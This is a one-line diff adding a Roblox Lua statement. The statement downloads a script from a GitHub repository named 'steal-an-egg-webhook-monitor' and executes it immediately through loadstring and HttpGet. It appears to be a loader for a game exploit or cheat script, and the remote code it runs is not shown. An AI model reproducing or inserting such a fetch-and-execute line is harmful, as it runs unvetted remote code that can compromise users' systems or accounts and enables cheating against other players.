@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/whybemqd/steal-an-egg-webhook-monitor/main/egg_webhook_monitor.lua"))()
